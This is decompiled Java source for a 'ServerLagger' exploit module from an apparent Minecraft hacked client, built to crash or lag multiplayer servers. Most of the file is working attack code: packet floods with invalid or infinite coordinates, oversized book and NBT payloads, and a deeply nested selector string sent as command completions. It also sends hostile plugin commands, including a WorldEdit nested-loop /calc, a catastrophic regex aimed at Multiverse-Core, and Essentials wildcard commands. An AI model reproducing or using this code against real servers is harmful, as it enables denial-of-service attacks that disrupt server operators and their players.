// Decompiled with: Procyon 0.6.0
// Class Version: 17
package me.nullpoint.mod.modules.impl.exploit;

import java.util.stream.Collector;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.Random;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import java.util.Optional;
import java.util.ArrayList;
import org.apache.commons.lang3.RandomStringUtils;
import net.minecraft.entity.Entity;
import java.util.Iterator;
import java.util.List;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.nbt.NbtElement;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtCompound;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.item.ItemConvertible;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Position;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import me.nullpoint.api.managers.CommandManager;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.RecipeEntry;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.screen.CraftingScreenHandler;
import me.nullpoint.mod.modules.settings.impl.BooleanSetting;
import me.nullpoint.mod.modules.settings.impl.SliderSetting;
import me.nullpoint.mod.modules.settings.impl.EnumSetting;
import me.nullpoint.mod.modules.Module;

public class ServerLagger extends Module
{
   private final EnumSetting<Mode> mode;
   private final SliderSetting offhandPackets;
   private final SliderSetting vehiclePackets;
   private final SliderSetting creativePackets;
   private final SliderSetting bookPackets;
   private final SliderSetting aacPackets;
   private final SliderSetting clickSlotPackets;
   private final SliderSetting interactPackets;
   private final SliderSetting movementPackets;
   private final SliderSetting craftPackets;
   private final SliderSetting sequencePackets;
   private final SliderSetting commandPackets;
   private final SliderSetting length;
   private final BooleanSetting autoDisable;
   private final BooleanSetting smartDisable;
   private final SliderSetting delay;
   int slot;
   int ticks;

   public ServerLagger() {
      super("ServerLagger", Category.Exploit);
      this.mode = this.add(new EnumSetting<Mode>("Mode", Mode.Selector));
      this.offhandPackets = this.add(new SliderSetting("OPackets", 1000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == Mode.OffhandSpam));
      this.vehiclePackets = this.add(new SliderSetting("VPackets", 2000.0, 100.0, 10000.0, 1.0, v -> this.mode.getValue() == Mode.Vehicle || this.mode.getValue() == Mode.Boat));
      this.creativePackets = this.add(new SliderSetting("CPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == Mode.CreativePacket));
      this.bookPackets = this.add(new SliderSetting("BookPackets", 100.0, 1.0, 1000.0, 1.0, v -> this.mode.getValue() == Mode.Book || this.mode.getValue() == Mode.CreativeBook));
      this.aacPackets = this.add(new SliderSetting("AACPackets", 5000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == Mode.AAC || this.mode.getValue() == Mode.AAC2 || this.mode.getValue() == Mode.NullPosition));
      this.clickSlotPackets = this.add(new SliderSetting("SlotPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == Mode.InvalidClickSlot));
      this.interactPackets = this.add(new SliderSetting("IPackets", 15.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == Mode.InteractNoCom || this.mode.getValue() == Mode.InteractItem));
      this.movementPackets = this.add(new SliderSetting("MPackets", 2000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == Mode.MovementSpam));
      this.craftPackets = this.add(new SliderSetting("CraftPackets", 3.0, 1.0, 100.0, 1.0, v -> this.mode.getValue() == Mode.Crafting));
      this.sequencePackets = this.add(new SliderSetting("SPackets", 200.0, 50.0, 2000.0, 1.0, v -> this.mode.getValue() == Mode.SequenceBlock || this.mode.getValue() == Mode.SequenceItem));
      this.commandPackets = this.add(new SliderSetting("Count", 3.0, 1.0, 5.0, 1.0, v -> this.mode.getValue() == Mode.Selector));
      this.length = this.add(new SliderSetting("Length", 2032.0, 1000.0, 3000.0, 1.0, v -> this.mode.getValue() == Mode.Selector));
      this.autoDisable = this.add(new BooleanSetting("AutoDisable", true));
      this.smartDisable = this.add(new BooleanSetting("SmartDisable", true));
      this.delay = this.add(new SliderSetting("Delay", 1.0, 0.0, 100.0, 1.0).setSuffix("tick"));
      this.slot = 5;
      this.ticks = 0;
   }

   @Override
   public void onUpdate() {
      if (nullCheck()) {
         if (this.autoDisable.getValue()) {
            this.disable();
         }
         return;
      }
      ++this.ticks;
      if (this.ticks <= this.delay.getValue()) {
         return;
      }
      this.ticks = 0;
      switch (this.mode.getValue()) {
         case Crafting: {
            if (!(ServerLagger.mc.player.currentScreenHandler instanceof CraftingScreenHandler) || ServerLagger.mc.getNetworkHandler() == null) {
               return;
            }
            try {
               final List<RecipeResultCollection> recipeResultCollectionList = ServerLagger.mc.player.getRecipeBook().getOrderedResults();
               for (final RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                  for (final RecipeEntry<?> recipe : recipeResultCollection.getRecipes(true)) {
                     for (int i = 0; i < this.craftPackets.getValue(); ++i) {
                        ServerLagger.mc.getNetworkHandler().sendPacket(new CraftRequestC2SPacket(ServerLagger.mc.player.currentScreenHandler.syncId, recipe, true));
                     }
                  }
               }
            }
            catch (final Exception e) {
               CommandManager.sendChatMessage("ยง4[!] " + e.getMessage());
               e.printStackTrace();
               if (this.smartDisable.getValue()) {
                  this.disable();
               }
            }
            break;
         }
         case SequenceItem: {
            for (int j = 0; j < this.sequencePackets.getValue(); ++j) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1));
            }
            break;
         }
         case SequenceBlock: {
            final Vec3d pos = new Vec3d(ServerLagger.mc.player.getX(), ServerLagger.mc.player.getY(), ServerLagger.mc.player.getZ());
            final BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
            for (int k = 0; k < this.sequencePackets.getValue(); ++k) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
            }
            break;
         }
         case MovementSpam: {
            if (ServerLagger.mc.getNetworkHandler() == null) {
               return;
            }
            try {
               final Vec3d current_pos = ServerLagger.mc.player.getPos();
               for (int l = 0; l < this.movementPackets.getValue(); ++l) {
                  final PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + this.getDistributedRandom(1.0), current_pos.y + this.getDistributedRandom(1.0), current_pos.z + this.getDistributedRandom(1.0), (float)rndD(90.0), (float)rndD(180.0), true);
                  ServerLagger.mc.getNetworkHandler().sendPacket(move_packet);
               }
            }
            catch (final Exception e) {
               CommandManager.sendChatMessage("ยง4[!] " + e.getMessage());
               e.printStackTrace();
               if (this.smartDisable.getValue()) {
                  this.disable();
               }
            }
            break;
         }
         case Selector: {
            final String overflow = this.generateJsonObject(this.length.getValueInt());
            final String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
            for (int k = 0; k < this.commandPackets.getValue(); ++k) {
               ServerLagger.mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
            }
            if (this.smartDisable.getValue()) {
               this.disable();
            }
            break;
         }
         case Lectern: {
            if (!(ServerLagger.mc.currentScreen instanceof LecternScreen)) {
               return;
            }
            ServerLagger.mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(ServerLagger.mc.player.currentScreenHandler.syncId, ServerLagger.mc.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, ServerLagger.mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
         case InteractNoCom: {
            for (int j = 0; j < this.interactPackets.getValue(); ++j) {
               final Vec3d cpos = this.pickRandomPos();
               ServerLagger.mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored(cpos), false), 0));
            }
            break;
         }
         case InteractOOB: {
            final Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255.0, Double.NEGATIVE_INFINITY);
            ServerLagger.mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
            break;
         }
         case InteractItem: {
            for (int j = 0; j < this.interactPackets.getValue(); ++j) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0));
            }
            break;
         }
         case InvalidClickSlot: {
            final Int2ObjectMap<ItemStack> REAL = (Int2ObjectMap<ItemStack>)new Int2ObjectArrayMap();
            REAL.put(0, new ItemStack(Items.RED_DYE, 1));
            for (int l = 0; l < this.clickSlotPackets.getValue(); ++l) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(ServerLagger.mc.player.currentScreenHandler.syncId, 123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
            }
            break;
         }
         case AAC: {
            for (double m = 0.0; m < this.aacPackets.getValue(); ++m) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger.mc.player.getX() + 9412.0 * m, ServerLagger.mc.player.getY() + 9412.0 * m, ServerLagger.mc.player.getZ() + 9412.0 * m, true));
            }
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
         case AAC2: {
            for (double m = 0.0; m < this.aacPackets.getValue(); ++m) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger.mc.player.getX() + 500000.0 * m, ServerLagger.mc.player.getY() + 500000.0 * m, ServerLagger.mc.player.getZ() + 500000.0 * m, true));
            }
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
         case NullPosition: {
            for (double m = 0.0; m < this.aacPackets.getValue(); ++m) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
            }
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
         case Book:
         case CreativeBook: {
            for (int j = 0; j < this.bookPackets.getValue(); ++j) {
               this.sendBadBook();
            }
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
         case CreativePacket: {
            if (!ServerLagger.mc.player.getAbilities().creativeMode) {
               if (this.smartDisable.getValue()) {
                  this.disable();
               }
               return;
            }
            final Vec3d pos = this.pickRandomPos();
            final NbtCompound tag = new NbtCompound();
            final NbtList list = new NbtList();
            final ItemStack the = new ItemStack(Items.CAMPFIRE);
            list.add(NbtDouble.of(pos.x));
            list.add(NbtDouble.of(pos.y));
            list.add(NbtDouble.of(pos.z));
            tag.put("Pos", list);
            the.setSubNbt("BlockEntityTag", tag);
            for (int i2 = 0; i2 < this.creativePackets.getValue(); ++i2) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, the));
            }
            break;
         }
         case Boat: {
            final Entity vehicle = ServerLagger.mc.player.getVehicle();
            if (vehicle == null) {
               if (this.smartDisable.getValue()) {
                  this.disable();
               }
               return;
            }
            if (!(vehicle instanceof BoatEntity) && this.smartDisable.getValue()) {
               this.disable();
            }
            for (int l = 0; l < this.vehiclePackets.getValue(); ++l) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket(true, true));
            }
            break;
         }
         case Vehicle: {
            final Entity vehicle = ServerLagger.mc.player.getVehicle();
            if (vehicle == null) {
               if (this.smartDisable.getValue()) {
                  this.disable();
               }
               return;
            }
            final BlockPos start = ServerLagger.mc.player.getBlockPos();
            final Vec3d end = new Vec3d(start.getX() + 0.5, start.getY() + 1, start.getZ() + 0.5);
            vehicle.updatePosition(end.x, end.y - 1.0, end.z);
            for (int i3 = 0; i3 < this.vehiclePackets.getValue(); ++i3) {
               ServerLagger.mc.getNetworkHandler().sendPacket(new VehicleMoveC2SPacket(vehicle));
            }
            break;
         }
         case OffhandSpam: {
            for (int index = 0; index < this.offhandPackets.getValue(); ++index) {
               ServerLagger.mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
               ServerLagger.mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
            }
            break;
         }
         case WorldEdit: {
            ServerLagger.mc.player.networkHandler.sendCommand("/calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
         case Chunk: {
            for (double yPos = ServerLagger.mc.player.getY(); yPos < 255.0; yPos += 5.0) {
               ServerLagger.mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger.mc.player.getX(), yPos, ServerLagger.mc.player.getZ(), true));
            }
            for (double i4 = 0.0; i4 < 6685.0; i4 += 5.0) {
               ServerLagger.mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger.mc.player.getX() + i4, 255.0, ServerLagger.mc.player.getZ() + i4, true));
            }
            break;
         }
         case MultiverseCore: {
            ServerLagger.mc.player.networkHandler.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
         case Essentials: {
            ServerLagger.mc.player.networkHandler.sendCommand("pay * a a");
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
         case Promote: {
            ServerLagger.mc.player.networkHandler.sendCommand("promote * a");
            if (this.smartDisable.getValue()) {
               this.disable();
               break;
            }
            break;
         }
      }
   }

   private void sendBadBook() {
      final String title = "/stop" + Math.random() * 400.0;
      final String mm255 = RandomStringUtils.randomAlphanumeric(255);
      switch (this.mode.getValue()) {
         case Book: {
            final ArrayList<String> pages = new ArrayList<String>();
            for (int i = 0; i < 50; ++i) {
                pages.add(mm255);
            }
            ServerLagger.mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(ServerLagger.mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
            break;
         }
         case CreativeBook: {
            for (int j = 0; j < 5; ++j) {
               if (this.slot > 45) {
                  this.slot = 0;
                  return;
               }
               ++this.slot;
               final ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
               final NbtCompound tag = new NbtCompound();
               final NbtList list = new NbtList();
               for (int k = 0; k < 99; ++k) {
                  list.add(NbtString.of("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
               }
               tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
               tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
               tag.put("pages", list);
               book.setNbt(tag);
               ServerLagger.mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(this.slot, book));
            }
            break;
         }
      }
   }

   public double getDistributedRandom(final double rad) {
      return rndD(rad) - rad / 2.0;
   }

   public static double rndD(final double rad) {
      final Random r = new Random();
      return r.nextDouble() * rad;
   }

   private Vec3d pickRandomPos() {
      return new Vec3d(new Random().nextInt(16777215), 255.0, new Random().nextInt(16777215));
   }

   private String generateJsonObject(final int levels) {
      final String json = IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
      return "{a:" + json;
   }

   @Override
   public String getInfo() {
      return this.mode.getValue().name();
   }

   @Override
   public void onDisable() {
      this.ticks = 999;
   }

   @Override
   public void onLogin() {
      if (this.autoDisable.getValue()) {
         this.disable();
      }
   }

   @Override
   public void onLogout() {
      if (this.autoDisable.getValue()) {
         this.disable();
      }
   }

   public enum Mode
   {
      Selector("Selector", 0),
      Crafting("Crafting", 1),
      SequenceItem("SequenceItem", 2),
      SequenceBlock("SequenceBlock", 3),
      MovementSpam("MovementSpam", 4),
      Lectern("Lectern", 5),
      InteractNoCom("InteractNoCom", 6),
      InteractOOB("InteractOOB", 7),
      InteractItem("InteractItem", 8),
      InvalidClickSlot("InvalidClickSlot", 9),
      AAC("AAC", 10),
      AAC2("AAC2", 11),
      NullPosition("NullPosition", 12),
      Book("Book", 13),
      CreativeBook("CreativeBook", 14),
      CreativePacket("CreativePacket", 15),
      Boat("Boat", 16),
      Vehicle("Vehicle", 17),
      WorldEdit("WorldEdit", 18),
      Chunk("Chunk", 19),
      OffhandSpam("OffhandSpam", 20),
      MultiverseCore("MultiverseCore", 21),
      Essentials("Essentials", 22),
      Promote("Promote", 23);

      Mode(final String string, final int i) {
      }
   }
}
